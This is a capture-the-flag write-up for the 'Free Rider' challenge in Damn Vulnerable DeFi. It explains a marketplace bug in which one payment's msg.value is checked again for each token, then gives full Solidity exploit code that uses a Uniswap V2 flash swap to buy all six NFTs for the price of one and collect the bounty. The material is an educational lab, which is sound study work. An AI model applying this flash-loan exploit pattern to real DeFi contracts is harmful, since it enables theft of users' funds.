### [Contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/free-rider)

### Task

>A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.

>The developers behind it have been notified the marketplace is vulnerable. All tokens can be taken. Yet they have absolutely no idea how to do it. So they’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way.

>You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more.

>If only you could get free ETH, at least for an instant.

### Observations

- The NFT marketplace contract has two buy functions, 1 private: `_buyOne()` and 1 external: `buyMany()`.
- The `buyMany()` function takes an array input of the token Id's to purchase and individually calls `_buyOne()` for each.
- The `buyOne()` function checks the `msg.value` is > the token `priceToPay`. However it checks the same `msg.value` for each token, not the combined cost for all tokens.
- In theory we can send the value of 1 NFT and purchase all NFT's because of this bug.
- Then send it to the `FreeRiderRecovery` contract to receive the reward payout.
- Only one problem, we dont have the ETH to pay the price of 1 NFT.
- So we can do all of this in one transaction using a UniswapV2 flash swap.
- Borrow 15WETH (which we dont yet have), unwrap it, purchase ALL nfts, send them to reward contract, swap wrap rewarded eth, repay weth loan. 
- Profit about 30ETH

### Steps
*Full exploit smart contract can be found [here](https://github.com/CharlieJRBenson/Smart-Contract-Hacking/blob/main/DamnVulnerableDefi/FreeRider/FreeRiderHack.sol)*

#### `attack()` function
- call pair's `swap()` function with data to swap only one token and the amount. (That triggers *FlashSwap* funcitonality).

```
 function attack(uint wethAmount) public {
        require(msg.sender == owner, "OnlyOwner");

        // get correct data to setup swap to be flash swap
        bytes memory data = abi.encode(pair.token0(), wethAmount);
        // call flash swap
        pair.swap(wethAmount, 0, address(this), data);
    }

```

#### `uniswapV2Call()` function is the callback function from the `swap()` call.

- Do malicious things stated above in this function then repay loan.

```
// This function is called by the pair contract, to receive tokens and then return them
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        require(msg.sender == address(pair), "not pair");
        require(sender == address(this), "not sender");

        (address tokenBorrow, uint256 wethAmount) = abi.decode(
            data,
            (address, uint256)
        );

        IWETH weth = IWETH(tokenBorrow);

        //unwrap the weth
        weth.withdraw(wethAmount);

        //set token ids
        uint8 tokenCount = 6;
        uint256[] memory tokens = new uint256[](tokenCount);
        for (uint i = 0; i < tokenCount; i++) {
            tokens[i] = i;
        }

        //buy all nft's for only 15 eth
        mktplace.buyMany{value: wethAmount}(tokens);
        nft = DamnValuableNFT(mktplace.token());

        //send all nfts to reward contract
        for (uint i = 0; i < tokenCount; i++) {
            nft.safeTransferFrom(address(this), recoveryContract, tokens[i]);
        }

        // approx 0.3% fee, +1 to round up
        uint fee = (wethAmount * 3) / 997 + 1;
        uint amountToRepay = wethAmount + fee;

        // wrap eth
        weth.deposit{value: amountToRepay}();

        // Repay
        weth.transfer(address(pair), amountToRepay);

        //send all remaining eth to player
        SafeTransferLib.safeTransferETH(owner, address(this).balance);
    }
```

#### have a `receive()` function to enable reward ether.

```
    receive() external payable {}
```